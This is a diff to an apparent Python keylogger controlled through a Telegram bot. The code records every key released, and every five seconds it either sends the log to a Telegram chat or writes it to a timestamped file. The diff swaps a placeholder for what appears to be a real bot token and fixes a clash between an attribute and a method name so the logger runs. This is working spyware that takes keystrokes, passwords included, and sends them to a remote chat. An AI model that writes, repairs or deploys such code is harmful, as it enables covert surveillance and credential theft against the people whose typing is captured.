@@ -5,7 +5,7 @@ import telebot
 from telebot import types
 
 # Replace with your Telegram bot token
-bot = telebot.TeleBot("YOUR_TELEGRAM_BOT_TOKEN")
+bot = telebot.TeleBot("7685898509:AAFAB5xh6CCT4IfoGLlolJL97yWUrVOaKjEgj")
 
 # Interval for saving reports in seconds
 SEND_REPORT_EVERY = 5
@@ -16,8 +16,8 @@ class Keylogger:
         self.report_method = report_method  # Reporting method: 'telegram' or 'file'
         self.interval = SEND_REPORT_EVERY  # Report interval
         self.log = ""  # String to store logged keystrokes
-        self.start = datetime.now()  # Start time for logging
-        self.end = datetime.now()  # End time for the current log
+        self.start_time = datetime.now()  # Start time for logging
+        self.end_time = datetime.now()  # End time for the current log
 
     def callback(self, event):
         """Capture keystrokes and format them."""
@@ -34,8 +34,8 @@ class Keylogger:
 
     def update_file_name(self):
         """Generate a unique filename for the log."""
-        start_dt_str = str(self.start)[:-7].replace(" ", "-").replace(":", "")
-        end_dt_str = str(self.end)[:-7].replace(" ", "-").replace(":", "")
+        start_dt_str = str(self.start_time)[:-7].replace(" ", "-").replace(":", "")
+        end_dt_str = str(self.end_time)[:-7].replace(" ", "-").replace(":", "")
         self.filename = f"keylog--{start_dt_str}_{end_dt_str}"
 
     def report_to_file(self):
@@ -52,22 +52,22 @@ class Keylogger:
     def report(self):
         """Generate and send the report based on the selected method."""
         if self.log:
-            self.end = datetime.now()
+            self.end_time = datetime.now()
             self.update_file_name()
             if self.report_method == 'telegram':
                 self.send_bot(self.log)
             elif self.report_method == 'file':
                 self.report_to_file()
-            self.start = datetime.now()
+            self.start_time = datetime.now()
 
         self.log = ""
         timer = Timer(interval=self.interval, function=self.report)
         timer.daemon = True
         timer.start()
 
-    def start(self):
+    def start_logging(self):
         """Start the keylogger."""
-        self.start = datetime.now()
+        self.start_time = datetime.now()
         keyboard.on_release(callback=self.callback)
         self.report()
         keyboard.wait()
@@ -90,10 +90,10 @@ def callback_worker(call):
     """Handle button clicks from the inline keyboard."""
     if call.data == 'start_keylogger_tg':
         keylogger = Keylogger(report_method="telegram", chat_id=call.from_user.id)
-        keylogger.start()
+        keylogger.start_logging()  # Changed method name here
     elif call.data == 'start_keylogger_file':
         keylogger = Keylogger(report_method="file")
-        keylogger.start()
+        keylogger.start_logging()  # Changed method name here
 
 
 # Start the Telegram bot
